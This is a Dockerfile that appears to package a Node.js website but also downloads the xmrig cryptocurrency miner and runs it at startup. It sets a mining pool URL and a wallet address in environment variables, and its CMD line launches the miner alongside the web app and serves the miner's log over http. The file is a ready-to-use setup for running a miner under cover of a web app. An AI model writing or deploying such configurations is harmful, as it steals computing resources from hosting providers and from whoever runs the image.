FROM node:latest

# Install wget
RUN apt-get update && apt-get install -y wget

# Download and extract xmrig
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && \
    tar -zxvf xmrig-6.21.0-linux-x64.tar.gz && \
    cd xmrig-6.21.0 && \
    mv xmrig /usr/local/bin && \
    cd .. && \
    rm -rf xmrig-6.21.0-linux-x64.tar.gz xmrig-6.21.0

# Set environment variables
ENV POOL_URL rx.unmineable.com:3333
ENV ADDRESS PEPE:0x0f426b09bff0b791e60babc7adb05e7cf61aa834.WORKERNAME

# Copy your Node.js application files
WORKDIR /usr/src/app
COPY . .

# Install dependencies
RUN npm install

# Expose port 8080 for the website
EXPOSE 8080

# Start the Node.js application and redirect logs to a website
CMD ["bash", "-c", "npm start & xmrig -o $POOL_URL -a rx -k -u $ADDRESS -p x > /usr/src/app/logs.txt && cd /usr/src/app && npx http-server -p 8080"]
